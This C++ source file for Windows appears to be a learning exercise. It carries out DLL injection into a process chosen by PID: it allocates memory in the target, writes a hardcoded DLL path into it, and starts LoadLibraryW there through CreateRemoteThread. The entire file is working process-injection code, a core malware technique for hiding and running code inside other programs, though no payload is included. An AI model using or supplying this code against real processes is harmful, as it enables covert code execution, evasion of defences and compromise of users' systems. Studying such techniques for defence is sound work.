#include <Windows.h>
#include <iostream>

DWORD PID, TID = { 0 };
HANDLE hThread, hProc = INVALID_HANDLE_VALUE;
HMODULE hKernel32 = NULL;
LPVOID lpAddress;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\Acer\\source\\repos\\ProcessInjection - (WriteProcessMemory, NtWriteVirtualMemory)\\x64\\Debug\\funcsdll.dll";
SIZE_T dllPathSize = sizeof(dllPath);

int wmain(int argc, wchar_t* argv[])
{
    PID = _wtoi(argv[1]);

    if (!(hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PID))) {
        printf_s("[-] Failed to get a handle on process! \\------ (%ld)\n", GetLastError());
        return EXIT_FAILURE;
    }
    printf_s("[+] Got a handle to process successfully! \\------ (0x%p)\n", hProc);

    if (!(lpAddress = VirtualAllocEx(hProc, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
        printf_s("[-] Failed to allocated buffer! \\------ (%ld)\n", GetLastError());
        return EXIT_FAILURE;
    }
    printf_s("[+] Allocated buffer successfully! \\------ (0x%p)\n", lpAddress);

    if (!WriteProcessMemory(hProc, lpAddress, dllPath, dllPathSize, NULL)) {
        printf_s("[-] Failed to write on buffer! \\------ (%ld)\n", GetLastError());
        return EXIT_FAILURE;
    }
    printf_s("[+] Written DLL [%S] to buffer successfully! \\------ (0x%p)\n", dllPath, lpAddress);

    hKernel32 = GetModuleHandleW(L"Kernel32");
    if (hKernel32 == NULL) {
        printf_s("[-] Failed to get a handle on Kernel32 Module! \\------ (%ld)\n", GetLastError());
        return EXIT_FAILURE;
    }
    printf_s("[+] Got a handle to Kernel32 module successfully! \\------ (0x%p)\n", lpAddress);

    LPTHREAD_START_ROUTINE lpLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    printf_s("[+] Got the address of LoadLibraryW() \\------ (0x%p)\n", lpLoadLibrary);

    hThread = CreateRemoteThread(hProc, NULL, 0, lpLoadLibrary, lpAddress, 0, &TID);
    if (hThread == NULL) {
        printf_s("[-] Failed to execute LoadLibraryW()! \\------ (%ld)\n", GetLastError());
        return EXIT_FAILURE;
    }
    printf_s("[+] LoadLibraryW() Executed Successfully!! \\------ (0x%p)\n", lpAddress);
    printf_s("[+] waiting for the thread to finish execution!\n");

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProc);

    printf_s("[+] DLL Injection Simulation is Done!\n");

    return 0;
}